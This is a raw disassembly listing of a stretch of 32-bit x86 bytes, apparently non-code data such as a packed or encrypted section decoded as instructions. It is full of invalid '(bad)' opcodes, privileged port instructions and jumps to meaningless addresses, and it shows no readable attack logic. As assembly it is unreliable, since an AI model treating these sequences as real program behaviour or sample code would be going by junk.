  40c86b:	xor    cl,BYTE PTR [edi]
  40c86d:	sbb    edi,ebp
  40c86f:	pop    ss
  40c870:	adc    eax,0x1b938cd7
  40c875:	ins    BYTE PTR es:[edi],dx
  40c876:	das    
  40c877:	sub    al,0xeb
  40c879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c87a:	mov    dl,dl
  40c87c:	jl     0x40c83c
  40c87e:	xor    dh,al
  40c880:	fidiv  WORD PTR [ecx+0x61]
  40c883:	sbb    al,0xa2
  40c885:	mov    edi,eax
  40c887:	call   0xc6f8f45d
  40c88c:	mov    al,0x63
  40c88e:	ins    BYTE PTR es:[edi],dx
  40c88f:	(bad)  [ebx+0x39]
  40c892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c893:	xor    al,cl
  40c895:	outs   dx,DWORD PTR ds:[esi]
  40c896:	mov    dl,0x6a
  40c898:	sub    bl,BYTE PTR [ebp-0x6929cab4]
  40c89e:	lock ds iret 
  40c8a1:	jb     0x40c91e
  40c8a3:	cmp    al,0xf7
  40c8a5:	scas   eax,DWORD PTR es:[edi]
  40c8a6:	test   BYTE PTR [edx-0x3f],cl
  40c8a9:	push   esp
  40c8aa:	cmc    
  40c8ab:	(bad)  
  40c8ac:	clc    
  40c8ad:	xchg   edi,eax
  40c8ae:	push   edx
  40c8af:	lods   eax,DWORD PTR ds:[esi]
  40c8b0:	push   edi
  40c8b1:	fsubr  QWORD PTR [ecx]
  40c8b3:	imul   ebp,DWORD PTR [edx-0x7d],0xbfd4d78
  40c8ba:	js     0x40c886
  40c8bc:	jb     0x40c8fd
  40c8be:	cmp    ah,BYTE PTR [esi]
  40c8c0:	sar    bh,0x3f
  40c8c3:	pop    eax
  40c8c4:	retf   
  40c8c5:	mov    bl,0xeb
  40c8c7:	inc    esi
  40c8c8:	ins    DWORD PTR es:[edi],dx
  40c8c9:	xor    al,0x17
  40c8cb:	(bad)  
  40c8cc:	out    0x6a,eax
  40c8ce:	cmp    al,0x20
  40c8d0:	shl    esi,0x33
  40c8d3:	nop
  40c8d4:	mov    ds:0x9e3bb33e,al
  40c8d9:	mov    esi,esi
  40c8db:	sbb    BYTE PTR [esi-0x547da8d9],dh
  40c8e1:	pop    ebp
  40c8e2:	mov    ds:0x198a929d,al
  40c8e7:	lock dec edi
  40c8e9:	mul    ah
  40c8eb:	mov    BYTE PTR [esi-0x6b],dh
  40c8ee:	xchg   ebx,eax
  40c8ef:	clts   
  40c8f1:	js     0x40c888
  40c8f3:	in     eax,dx
  40c8f4:	xlat   BYTE PTR ds:[ebx]
  40c8f5:	imul   ebx,eax,0xffffff83
  40c8f8:	and    DWORD PTR [ebx],0x65
  40c8fb:	xchg   esp,eax
  40c8fc:	call   0x8ecd:0xd7f522d3
  40c903:	cmp    cl,ah
  40c905:	push   es
  40c906:	ins    BYTE PTR es:[edi],dx
  40c907:	ins    BYTE PTR es:[edi],dx
  40c908:	mov    esi,0xec9c4403
  40c90d:	dec    esp
  40c90e:	(bad)  
  40c910:	jp     0x40c98e
  40c912:	sahf   
  40c913:	(bad)  
  40c915:	out    0x7c,eax
  40c917:	push   es
  40c918:	imul   eax,DWORD PTR [ebx-0x28],0x47
  40c91c:	inc    ecx
  40c91d:	(bad)  
  40c91e:	sbb    eax,0x5ee40ce
  40c923:	sbb    al,BYTE PTR [esp+edx*8-0x3b]
  40c927:	pop    esi
  40c928:	mov    ebx,0xc264fc20
  40c92d:	cli    
  40c92e:	in     al,dx
  40c92f:	ins    BYTE PTR es:[edi],dx
  40c930:	and    al,0x86
  40c932:	xor    DWORD PTR [bx+di],0xffffffe3
  40c936:	push   0xb499fcab
  40c93b:	mov    al,0x60
  40c93e:	push   0x65
  40c940:	shl    BYTE PTR [esi+0x4d],1
  40c943:	xor    cl,dh
  40c945:	(bad)  
  40c946:	stos   DWORD PTR es:[edi],eax
  40c947:	xor    DWORD PTR [edi],ebx
  40c949:	inc    ebp
  40c94a:	fnstenv [esi+0x4b]
  40c94d:	stc    
  40c94e:	inc    edx
  40c94f:	pop    es
  40c950:	in     eax,dx
  40c951:	cli    
  40c952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c953:	retf   0x623a
  40c956:	mov    ebp,0xe9783a7f
  40c95b:	mov    esi,DWORD PTR [eax]
  40c95d:	jp     0x40c944
  40c95f:	jmp    0x8b98:0x768be510
  40c966:	stos   BYTE PTR es:[edi],al
  40c967:	inc    edx
  40c968:	aam    0x22
  40c96a:	add    bh,BYTE PTR [edx]
  40c96c:	adc    al,0x94
  40c96e:	sub    edi,DWORD PTR [edx]
  40c970:	imul   edx,esi,0xffffffda
  40c973:	inc    esi
  40c974:	cld    
  40c975:	push   edi
  40c976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c977:	pop    DWORD PTR [edx+0x4c87c07b]
  40c97d:	fimul  DWORD PTR [edx-0x75]
  40c980:	rol    BYTE PTR ds:0xaf2294ab,1
  40c986:	icebp  
  40c987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c988:	ficomp DWORD PTR [edx]
  40c98a:	mov    bh,0x30
  40c98c:	es lock sbb bl,cl
  40c990:	aam    0x63
  40c992:	push   ebx
  40c993:	push   0xc521679d
  40c998:	pop    ss
  40c999:	test   al,0x9f
  40c99b:	or     eax,0xa96746d4
  40c9a0:	xor    eax,0x4185262c
  40c9a5:	inc    ebp
  40c9a6:	cli    
  40c9a7:	ins    BYTE PTR es:[edi],dx
  40c9a8:	cld    
  40c9a9:	dec    ebx
  40c9aa:	sbb    esp,DWORD PTR [eax+edi*1+0x39]
  40c9ae:	jbe    0x40c9eb
  40c9b0:	pop    edx
  40c9b1:	cli    
  40c9b2:	pop    ebp
  40c9b3:	and    al,0x78
  40c9b5:	gs dec ebx
  40c9b7:	mov    ds:0xfad5797b,eax
  40c9bc:	sub    DWORD PTR [di+0x19],0x2c
  40c9c1:	out    dx,al
  40c9c2:	and    DWORD PTR [ebp+0x366a689a],0xb81df462
  40c9cc:	call   0xa78c30bb
  40c9d1:	push   es
  40c9d2:	xchg   ebx,eax
  40c9d3:	xor    eax,0x8a99de8c
  40c9d8:	repz (bad) 
  40c9da:	aam    0x10
  40c9dc:	dec    ecx
  40c9dd:	or     eax,0x22f2beff
  40c9e2:	xor    bl,BYTE PTR [eax+edx*2]
  40c9e5:	jnp    0x40c979
  40c9e7:	imul   edx,DWORD PTR [ecx-0x11c45b43],0x26
  40c9ee:	out    dx,al
  40c9ef:	or     eax,0x8e26d837
  40c9f4:	jbe    0x40c9db
  40c9f6:	sbb    ch,al
  40c9f8:	dec    esp
  40c9f9:	pushf  
  40c9fa:	pop    esi
  40c9fb:	push   edi
  40c9fc:	mov    dh,0xa6
  40c9fe:	jmp    0xcbb4f63
  40ca03:	sbb    DWORD PTR [edx-0x1],ecx
  40ca06:	push   cs
  40ca07:	sbb    bl,ch
  40ca09:	les    eax,FWORD PTR ds:0x2e966bff
  40ca0f:	arpl   WORD PTR [ebx+0x5376c595],si
  40ca15:	pop    esp
  40ca16:	cmp    cl,BYTE PTR [ecx+0x1af131a9]
  40ca1c:	mov    al,ds:0xfe8b7784
  40ca21:	pop    ds
  40ca22:	sar    BYTE PTR ds:0xb0004eb1,1
  40ca28:	out    dx,eax
  40ca29:	pushf  
  40ca2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca2b:	jnp    0x40ca1c
  40ca2d:	es int 0xff
  40ca30:	jb     0x40c9de
  40ca32:	pusha  
  40ca33:	addr16 data16 jle 0x40ca3b
  40ca37:	mov    esi,0x76c57f3f
  40ca3c:	mov    DWORD PTR [ebp+0x4fa92ee1],esp
  40ca42:	aaa    
  40ca43:	push   cs
  40ca44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca45:	je     0x40ca1f
  40ca47:	in     al,dx
  40ca48:	nop
  40ca49:	out    dx,al
  40ca4a:	push   ss
  40ca4b:	sbb    ah,BYTE PTR [ebp+0x7f]
  40ca4e:	lock pop eax
  40ca50:	pop    edx
  40ca51:	ins    DWORD PTR es:[edi],dx
  40ca52:	es push es
  40ca54:	cld    
  40ca55:	rcl    BYTE PTR [edi+0x67ade8ec],0xae
  40ca5c:	sub    al,cl
  40ca5e:	push   edi
  40ca5f:	adc    ebx,edx
  40ca61:	push   ss
  40ca62:	adc    dl,dh
  40ca64:	xchg   edx,eax
  40ca65:	data16 mov ch,0x6e
  40ca68:	fwait
  40ca69:	jle    0x40ca09
  40ca6b:	xchg   esp,eax
  40ca6c:	xchg   esp,eax
  40ca6d:	aas    
  40ca6e:	pusha  
  40ca6f:	adc    al,BYTE PTR [esi]
  40ca71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca72:	dec    eax
  40ca73:	shr    DWORD PTR [ecx+0x38],0x2f
  40ca77:	std    
  40ca78:	imul   BYTE PTR [ebp+0x2d]
  40ca7b:	shl    DWORD PTR [ebx],0x58
  40ca7e:	jmp    0x3056c4a7
  40ca83:	dec    edx
  40ca84:	(bad)  
  40ca86:	aad    0x28
  40ca88:	pop    ebx
  40ca89:	daa    
  40ca8a:	test   eax,0x44f6c0a4
  40ca8f:	test   al,0xc7
  40ca91:	bound  esi,QWORD PTR [eax]
  40ca93:	inc    eax
  40ca94:	cmp    DWORD PTR [edx-0x69],ebx
  40ca97:	pop    esi
  40ca98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca99:	push   eax
  40ca9a:	sbb    eax,DWORD PTR [edx-0x6430e87c]
  40caa0:	pop    ds
  40caa1:	std    
  40caa2:	inc    esp
  40caa3:	lods   al,BYTE PTR ds:[esi]
  40caa4:	ret    
  40caa5:	in     al,dx
  40caa6:	pop    esp
  40caa7:	cmp    al,0xd1
  40caa9:	push   ebp
  40caaa:	daa    
  40caab:	push   0xffffffec
  40caad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caae:	repz jbe 0x40cb1f
  40cab1:	sub    BYTE PTR [edx+0x2],dh
  40cab4:	aas    
  40cab5:	adc    eax,0xdecf8a05
  40caba:	pop    eax
  40cabb:	jmp    0xa423e630
  40cac0:	push   esp
  40cac1:	jmp    0xeb4b43da
  40cac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cac7:	mov    bl,0xb
  40cac9:	sub    esi,DWORD PTR [edi+0xb8b74cc]
  40cacf:	xchg   ecx,eax
  40cad0:	sahf   
  40cad1:	mov    ecx,0x7da64e62
  40cad6:	mov    ch,0x54
  40cad8:	cmc    
  40cad9:	xor    DWORD PTR [eax+0x70],esp
  40cadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cadd:	adc    DWORD PTR [ecx+ebp*4-0x253e7094],esi
  40cae4:	outs   dx,BYTE PTR ds:[esi]
  40cae5:	push   esi
  40cae6:	imul   esi,edi,0x8bcee363
  40caec:	ds cmp eax,0xcfa4975c
  40caf2:	push   eax
  40caf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caf4:	sbb    DWORD PTR [edx-0x3f],0xc160d30a
  40cafb:	xor    dh,cl
  40cafd:	or     edi,DWORD PTR ds:0x75aa8377
  40cb03:	add    DWORD PTR [ebx-0x65],ecx
  40cb06:	dec    ebx
  40cb07:	and    edx,DWORD PTR [ebx]
  40cb09:	mov    ah,0xd
  40cb0b:	sub    esp,DWORD PTR [ebp-0x1f4908b5]
  40cb11:	mov    esp,0x74eddb2e
  40cb16:	stos   DWORD PTR es:[edi],eax
  40cb17:	rol    cl,0x54
  40cb1a:	or     eax,0xc8ad55f0
  40cb1f:	test   eax,0x1997fffc
  40cb24:	shl    BYTE PTR [edx+0x6eb0b2a3],1
  40cb2a:	mov    al,ds:0xfaa3c5fc
  40cb2f:	pop    eax
  40cb30:	inc    edi
  40cb31:	mov    cl,0xf9
  40cb33:	or     BYTE PTR [eax+esi*4-0x8959a7a],dh
  40cb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb3b:	test   DWORD PTR [esi+0x39],esp
  40cb3e:	jb     0x40cbac
  40cb40:	pop    ebx
  40cb41:	jns    0x40cb69
  40cb43:	or     bh,al
  40cb45:	add    ecx,DWORD PTR ds:0x2e9c44fd
  40cb4b:	or     BYTE PTR [ebp+0xd3654cf],ah
  40cb51:	xchg   edx,eax
  40cb52:	push   0xfa3b3bde
  40cb57:	fwait
  40cb58:	(bad)  
  40cb59:	ins    DWORD PTR es:[edi],dx
  40cb5a:	mov    bh,0xd3
  40cb5c:	das    
  40cb5d:	sbb    al,0x45
  40cb5f:	imul   esp,eax,0x884fb25a
  40cb65:	cmp    al,0x6b
  40cb67:	fld    TBYTE PTR [edx-0x3f]
  40cb6a:	popa   
  40cb6b:	jg     0x40cb18
  40cb6d:	icebp  
  40cb6e:	sbb    BYTE PTR [ebp+0x1a7c213c],bl
  40cb74:	jle    0x40cb79
  40cb76:	xor    al,BYTE PTR [ebx+ebp*8+0x34e3b1fb]
  40cb7d:	mov    al,ds:0x8fa132ed
  40cb82:	adc    eax,0xbdb1517a
  40cb87:	xchg   ebp,eax
  40cb88:	xchg   ebp,eax
  40cb89:	jne    0x40cbc3
  40cb8b:	popf   
  40cb8c:	jne    0x40cbf1
  40cb8e:	and    al,0x22
  40cb90:	das    
  40cb91:	(bad)  
  40cb92:	inc    eax
  40cb94:	jo     0x40cbe7
  40cb96:	addr16 or eax,0x95907728
  40cb9c:	pop    es
  40cb9d:	into   
  40cb9e:	test   eax,0x9643c42b
  40cba3:	sar    DWORD PTR ds:0xd40a958c,cl
  40cba9:	mov    ah,0x1d
  40cbab:	adc    DWORD PTR [edi-0x53],ebp
  40cbae:	data16 aam 0xde
  40cbb1:	rcl    DWORD PTR [ebx+0x5a],cl
  40cbb4:	addr16 xor al,0xbe
  40cbb7:	scas   eax,DWORD PTR es:[edi]
  40cbb8:	and    DWORD PTR [edi],esi
  40cbba:	xchg   esp,eax
  40cbbb:	scas   al,BYTE PTR es:[edi]
  40cbbc:	out    dx,eax
  40cbbd:	fwait
  40cbbe:	push   eax
  40cbbf:	ror    BYTE PTR [ecx+0x6e],0x7c
  40cbc3:	je     0x40cc27
  40cbc5:	lds    esp,FWORD PTR [edx+0x5e]
  40cbc8:	or     BYTE PTR ds:0x8938dfb,0x14
  40cbcf:	repz dec ebp
  40cbd1:	iret   
  40cbd2:	jle    0x40cc0f
  40cbd4:	sbb    BYTE PTR [esi+0xb02de17],bl
  40cbda:	shl    BYTE PTR [edx+0x74],1
  40cbdd:	dec    ebp
  40cbde:	and    ebp,eax
  40cbe0:	imul   esp,DWORD PTR [esi+ecx*1+0x19],0xabb647bd
  40cbe8:	clc    
  40cbe9:	xchg   esp,eax
  40cbea:	mov    ecx,0xb22401e1
  40cbef:	retf   0x8c23
  40cbf2:	add    al,0xe0
  40cbf4:	lock (bad) 
  40cbf6:	xchg   ecx,eax
  40cbf7:	fadd   QWORD PTR [eax-0x68]
  40cbfa:	mov    DWORD PTR ds:0x45632db2,edi
  40cc00:	popa   
  40cc01:	xchg   ecx,eax
  40cc02:	ja     0x40cb9a
  40cc04:	mov    bl,0x22
  40cc06:	rol    DWORD PTR [esi-0x28],0x90
  40cc0a:	sti    
  40cc0b:	enter  0xdb38,0x40
  40cc0f:	in     eax,dx
  40cc10:	jmp    0xcea7:0xa81b25fe
  40cc17:	cli    
  40cc18:	push   eax
  40cc19:	cld    
  40cc1a:	inc    edi
  40cc1b:	dec    BYTE PTR [eax-0x12d87884]
  40cc21:	rcr    BYTE PTR cs:0x93b48511,cl
  40cc28:	mov    al,ds:0x319fb9c8
  40cc2d:	stos   DWORD PTR es:[edi],eax
  40cc2e:	sub    al,0xf1
  40cc30:	mov    al,ds:0xe4512c9f
  40cc35:	dec    ecx
  40cc36:	xchg   edx,eax
  40cc37:	inc    esi
  40cc38:	arpl   WORD PTR [ebx-0x48],dx
  40cc3b:	int3   
  40cc3c:	shl    BYTE PTR [edi],1
  40cc3e:	enter  0xf492,0x6e
  40cc42:	iret   
  40cc43:	or     dl,ch
  40cc45:	mov    dl,0xc
  40cc47:	inc    edx
  40cc48:	jmp    0x871b:0x886c6f25
  40cc4f:	je     0x40ccb7
  40cc51:	adc    BYTE PTR [edi-0x37],dl
  40cc54:	leave  
  40cc55:	cs and eax,0x53c7f386
  40cc5b:	fstp   TBYTE PTR [esi-0x2b31f660]
  40cc61:	and    al,0x96
  40cc63:	stos   DWORD PTR es:[edi],eax
  40cc64:	cld    
  40cc65:	mov    edx,0x670a0e1a
  40cc6a:	add    BYTE PTR ds:0x4de8efd4,ah
  40cc70:	in     eax,dx
  40cc71:	push   ds
  40cc72:	fsubr  DWORD PTR [edx+0x7a]
  40cc75:	xor    ebp,DWORD PTR [esp+eax*1]
  40cc78:	daa    
  40cc79:	call   0x8e67a800
  40cc7e:	test   esi,ebp
  40cc80:	pop    edx
  40cc81:	psrlw  mm2,QWORD PTR [eax-0x4242ba8]
  40cc88:	push   edi
  40cc89:	jecxz  0x40ccc4
  40cc8b:	mov    dl,BYTE PTR [ebp+0x7a]
  40cc8e:	or     DWORD PTR [edx],edx
  40cc90:	xor    ch,0x91
  40cc93:	jg     0x40cc6e
  40cc95:	int    0xb9
  40cc97:	out    0x8a,eax
  40cc99:	popa   
  40cc9a:	cld    
  40cc9b:	stos   BYTE PTR es:[edi],al
  40cc9c:	out    0x31,al
  40cc9e:	mov    dh,0xe8
  40cca0:	sub    edi,DWORD PTR [edx+0x2c362567]
  40cca6:	mov    ds:0xb9093e01,al
  40ccab:	xchg   edi,eax
  40ccac:	data16 jbe 0x40cc79
  40ccaf:	mov    ecx,0x5066ef89
  40ccb4:	lods   al,BYTE PTR ds:[esi]
  40ccb5:	imul   edi,DWORD PTR [esi+0x3e4f0a31],0x5f
  40ccbc:	pushf  
  40ccbd:	into   
  40ccbe:	outs   dx,BYTE PTR ds:[esi]
  40ccbf:	push   0x2
  40ccc1:	ins    DWORD PTR es:[edi],dx
  40ccc2:	jg     0x40cc45
  40ccc4:	not    cl
  40ccc6:	jle    0x40ccc4
  40ccc8:	pop    ecx
  40ccc9:	icebp  
  40ccca:	packssdw mm4,mm3
  40cccd:	xchg   edi,eax
  40ccce:	cdq    
  40cccf:	jl     0x7cb4f28
  40ccd5:	jecxz  0x40cd18
  40ccd7:	aaa    
  40ccd8:	add    esi,DWORD PTR [edx]
  40ccda:	cwde   
  40ccdb:	dec    ecx
  40ccdc:	(bad)  
  40ccde:	fwait
  40ccdf:	push   0xffffff88
  40cce1:	lods   al,BYTE PTR ds:[esi]
  40cce2:	div    dl
  40cce4:	xchg   edx,eax
  40cce5:	dec    edi
  40cce6:	mov    gs,WORD PTR [esi-0x713cea87]
  40ccec:	xor    ebx,DWORD PTR [esi+0x5b994426]
  40ccf2:	xchg   ebx,eax
  40ccf3:	inc    ecx
  40ccf4:	sahf   
  40ccf5:	ret    0xb2a6
  40ccf8:	js     0x40cccb
  40ccfa:	sub    edi,edx
  40ccfc:	(bad)  
  40ccfd:	pop    ebx
  40ccfe:	repnz mov esi,0x41a6b46f
  40cd04:	icebp  
  40cd05:	or     DWORD PTR [edx+0x1c],ecx
  40cd08:	xor    BYTE PTR [ecx+0x52],0xa3
  40cd0c:	pop    esp
  40cd0d:	add    eax,0x58df33c
  40cd12:	aaa    
  40cd13:	into   
  40cd14:	xor    edi,DWORD PTR [edi+ebp*4-0x703ad76b]
  40cd1b:	(bad)  
  40cd1c:	popf   
  40cd1d:	or     eax,0x229bb4f4
  40cd22:	jmp    0x40cd7a
  40cd24:	rcl    BYTE PTR [ecx-0x45],0x80
  40cd28:	jge    0x40cd19
  40cd2a:	hlt    
  40cd2b:	jmp    0x7d240621
  40cd30:	inc    esp
  40cd31:	sbb    al,0x92
  40cd33:	mov    al,ds:0x19b679eb
  40cd38:	or     edi,ebx
  40cd3a:	push   0x2e
  40cd3c:	mov    eax,0xa3864b70
  40cd41:	sub    ch,BYTE PTR [eax]
  40cd43:	dec    esi
  40cd44:	or     BYTE PTR ds:[ebx+ebx*2],dl
  40cd48:	in     eax,0x12
  40cd4a:	push   ecx
  40cd4b:	cld    
  40cd4c:	push   eax
  40cd4d:	cwde   
  40cd4e:	cwde   
  40cd4f:	dec    esp
  40cd50:	rcr    BYTE PTR [esi+ebp*8-0x7f2e3010],0x42
  40cd58:	fdiv   QWORD PTR [edx+ecx*2-0x8b7897]
  40cd5f:	push   ebp
  40cd60:	(bad)
  40cd63:	mov    edx,ebp
  40cd65:	cmc    
  40cd66:	xchg   esp,eax
  40cd67:	push   ebx
  40cd68:	fbstp  TBYTE PTR [esp+edi*1-0x261eacf0]
  40cd6f:	mov    bl,bl
  40cd71:	lods   al,BYTE PTR ds:[esi]
  40cd72:	xchg   esp,eax
  40cd73:	push   ebp
  40cd74:	push   ebx
  40cd75:	mov    DWORD PTR [eax],eax
  40cd77:	adc    DWORD PTR [ecx],ecx
  40cd79:	xor    ch,BYTE PTR [ebp+0x5c]
  40cd7c:	mov    ecx,0x8ce63449
  40cd81:	scas   al,BYTE PTR es:[edi]
  40cd82:	mov    edx,0x2502d5b
  40cd87:	aad    0x54
  40cd89:	imul   edx,DWORD PTR [ebx+0x67],0x8e920da5
  40cd90:	adc    eax,0x8e6f8af0
  40cd95:	mov    ebx,0xa4e9e046
  40cd9a:	ret    0x5bd8
  40cd9d:	dec    eax
  40cd9e:	jg     0x40cd54
  40cda0:	div    dh
  40cda2:	add    ch,cl
  40cda4:	mov    ds:0x932c7a0b,al
  40cda9:	das    
  40cdaa:	sub    DWORD PTR [edi-0xb90cc84],edx
  40cdb0:	xchg   ecx,eax
  40cdb1:	sbb    BYTE PTR [edx-0x2cf37df4],cl
  40cdb7:	ins    DWORD PTR es:[edi],dx
  40cdb8:	mov    ebx,0x253dc2a4
  40cdbd:	repz fwait
  40cdbf:	imul   eax,ecx,0x2d
  40cdc2:	xchg   esp,eax
  40cdc3:	ret    
  40cdc4:	inc    esi
  40cdc5:	ror    DWORD PTR [esi],cl
  40cdc7:	cmp    esi,DWORD PTR [ecx+0x6a]
  40cdca:	icebp  
  40cdcb:	stos   DWORD PTR es:[edi],eax
  40cdcc:	inc    ebx
  40cdcd:	sub    eax,esi
  40cdcf:	mov    bl,BYTE PTR [esi]
  40cdd1:	retf   
  40cdd2:	cmp    DWORD PTR [ecx+0x6],edx
  40cdd5:	scas   al,BYTE PTR es:[edi]
  40cdd6:	fcmovnbe st,st(2)
  40cdd8:	out    0x9a,eax
  40cdda:	js     0x40ce59
  40cddc:	jmp    0x25ce21b9
  40cde1:	(bad)  
  40cde2:	in     al,0x91
  40cde4:	mov    BYTE PTR [esp+edx*8-0x3d],ch
  40cde8:	mov    BYTE PTR [edx-0x3ef12609],cl
  40cdee:	mov    ebp,0x14944669
  40cdf3:	mov    WORD PTR [edx+0x2a],?
  40cdf6:	call   0xd53d:0x39b67ff
  40cdfd:	pop    ss
  40cdfe:	xchg   edx,eax
  40cdff:	out    0x71,eax
  40ce01:	ins    DWORD PTR es:[edi],dx
  40ce02:	(bad)  
  40ce03:	cdq    
  40ce04:	adc    DWORD PTR [edx-0x4f],ebx
  40ce07:	add    BYTE PTR [edx+0xc9fc98b],al
  40ce0d:	mov    cl,0x76
  40ce0f:	push   edx
  40ce10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce11:	clc    
  40ce12:	xchg   esi,eax
  40ce13:	inc    ecx
  40ce14:	jbe    0x40cdc4
  40ce16:	xor    al,0x7c
  40ce18:	sbb    bl,BYTE PTR [edi+ecx*4]
  40ce1b:	xchg   esp,eax
  40ce1c:	adc    ah,BYTE PTR [ecx]
  40ce1e:	jge    0x40cde9
  40ce20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce21:	mov    dh,0xb1
  40ce23:	dec    edx
  40ce24:	pop    esp
  40ce25:	fisttp DWORD PTR [eax]
  40ce27:	fs pop ebx
  40ce2a:	(bad)  
  40ce2c:	and    DWORD PTR [esi],0x4b
  40ce2f:	adc    dl,0xd
  40ce32:	out    0xa0,al
  40ce34:	or     DWORD PTR [edx+ebx*8-0x3385244d],eax
  40ce3b:	rol    DWORD PTR [ebx+0x3ed8f9fe],1
  40ce41:	lds    ebp,FWORD PTR [ecx-0x4e]
  40ce44:	add    BYTE PTR [ecx+0x48],dl
  40ce47:	dec    eax
  40ce48:	mov    ds,WORD PTR [ebp+0x5089f92e]
  40ce4e:	lds    ecx,FWORD PTR [ecx]
  40ce50:	mov    bh,0x3
  40ce52:	test   DWORD PTR [ebx-0x7c],eax
  40ce55:	mov    dl,0xbf
  40ce57:	and    al,0xa2
  40ce5a:	jmp    DWORD PTR [edi]
  40ce5c:	inc    ecx
  40ce5d:	dec    ebx
  40ce5e:	fistp  WORD PTR [ecx]
  40ce60:	mov    DWORD PTR ds:0xd1b82f3,eax
  40ce66:	sub    DWORD PTR [edx-0x33],0xffffffb7
  40ce6a:	scas   eax,DWORD PTR es:[edi]
  40ce6b:	push   0x870cdbc7
  40ce70:	popf   
  40ce71:	rcr    BYTE PTR [edi+ecx*1],1
  40ce74:	push   esp
  40ce75:	jge    0x40ced9
  40ce77:	push   edx
  40ce78:	ds mov cl,0x36
  40ce7b:	leave  
  40ce7c:	push   eax
  40ce7d:	cli    
  40ce7e:	inc    ecx
  40ce7f:	shl    DWORD PTR [ebx+ebp*1-0x31ff9f85],1
  40ce86:	aad    0x69
  40ce88:	(bad)
  40ce8c:	pop    ds
  40ce8d:	push   esi
  40ce8e:	test   al,0xb3
  40ce90:	(bad)  
  40ce91:	(bad)  
  40ce92:	sub    al,0xcd
  40ce94:	cs xchg ecx,eax
  40ce96:	call   0x55c44861
  40ce9b:	xlat   BYTE PTR ds:[ebx]
  40ce9c:	fistp  DWORD PTR [ebx-0x147d3d64]
  40cea2:	call   0xdb0a025f
  40cea7:	adc    esp,0xffffffe1
  40ceaa:	sub    al,BYTE PTR [esp+eax*8]
  40cead:	push   ss
  40ceae:	push   esp
  40ceaf:	push   cs
  40ceb0:	dec    ebx
  40ceb1:	sub    BYTE PTR [ebp-0x10d32d06],dh
  40ceb7:	jae    0x40cef8
  40ceb9:	xor    DWORD PTR ds:0xc40c63b6,esp
  40cebf:	out    dx,eax
  40cec0:	loop   0x40cef5
  40cec2:	xor    al,0xd1
  40cec4:	cdq    
  40cec5:	imul   eax,DWORD PTR [esi],0x49a3b22
  40cecb:	std    
  40cecc:	sbb    DWORD PTR [eax+ebx*4+0x48884192],esp
  40ced3:	xor    eax,0x8bcd902
  40ced8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ced9:	aaa    
  40ceda:	xlat   BYTE PTR ds:[ebx]
  40cedb:	dec    eax
  40cedc:	jns    0x40cedf
  40cede:	stos   BYTE PTR es:[edi],al
  40cedf:	pop    esi
  40cee0:	jg     0x40cf37
  40cee2:	jbe    0x40ceee
  40cee4:	in     eax,dx
  40cee5:	inc    ebp
  40cee6:	test   eax,0x119cf76a
  40ceeb:	xchg   ebx,eax
  40ceec:	jae    0x40cefa
  40ceee:	imul   ecx,DWORD PTR [esi-0x1c],0xffffff98
  40cef2:	or     BYTE PTR [ebx+ebp*2-0x43],ah
  40cef6:	or     al,al
  40cef8:	imul   edi,DWORD PTR [edx],0xd19d3352
  40cefe:	cmp    DWORD PTR [ecx+eiz*4],0x6397cd62
  40cf05:	into   
  40cf06:	in     al,dx
  40cf07:	push   ds
  40cf08:	sti    
  40cf09:	xor    cl,BYTE PTR [ecx-0x41]
  40cf0c:	sub    esi,DWORD PTR [edi+esi*2+0x3ca1174f]
  40cf13:	pop    esi
  40cf14:	jno    0x40cf0c
  40cf16:	jns    0x40cf4c
  40cf18:	mov    cl,0x89
  40cf1a:	imul   ebp,DWORD PTR [edx],0xaa03bf72
  40cf20:	mov    dl,0x67
  40cf22:	addr16 (bad) 
  40cf24:	fwait
  40cf25:	pop    ds
  40cf26:	mov    bl,0x47
  40cf28:	xor    BYTE PTR [edi+0x18],dl
  40cf2b:	ins    BYTE PTR es:[edi],dx
  40cf2c:	dec    ebp
  40cf2d:	xchg   edi,eax
  40cf2e:	mov    DWORD PTR [edi+0x53ab2157],esi
  40cf34:	jae    0x40cf2e
  40cf36:	mov    ebp,0x151e64a1
  40cf3b:	adc    ebp,eax
  40cf3d:	jmp    0x40cfb3
  40cf3f:	(bad)  
  40cf40:	call   0xf74b3da2
  40cf45:	loop   0x40cf89
  40cf47:	in     eax,0xd1
  40cf49:	stos   BYTE PTR es:[edi],al
  40cf4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf4b:	add    dl,BYTE PTR [edx+0x2663076f]
  40cf51:	inc    ecx
  40cf52:	inc    esi
  40cf54:	xor    DWORD PTR [ebx+0x17],ecx
  40cf57:	xchg   esp,eax
  40cf58:	adc    eax,0x9a1fe7be
  40cf5d:	repnz add eax,0x108fafa1
  40cf63:	loopne 0x40cf36
  40cf65:	mov    esp,DWORD PTR [ebp-0x62]
  40cf68:	mov    esi,0x4734a831
  40cf6d:	fidiv  DWORD PTR [edi]
  40cf6f:	inc    esi
  40cf70:	and    ecx,ebp
  40cf72:	loopne 0x40cf4a
  40cf74:	xor    bh,dh
  40cf76:	mov    cl,0x20
  40cf78:	push   es
  40cf79:	fisttp QWORD PTR [edi+0x58cd2837]
  40cf7f:	pusha  
  40cf80:	sub    ebx,esp
  40cf82:	mul    DWORD PTR [edx+esi*1-0x2b7e2029]
  40cf89:	sub    BYTE PTR [eax],ah
  40cf8b:	test   BYTE PTR [esi+0x49],al
  40cf8e:	mov    ch,0xe
  40cf90:	and    ecx,DWORD PTR [esi+0x2b]
  40cf93:	ja     0x40cf71
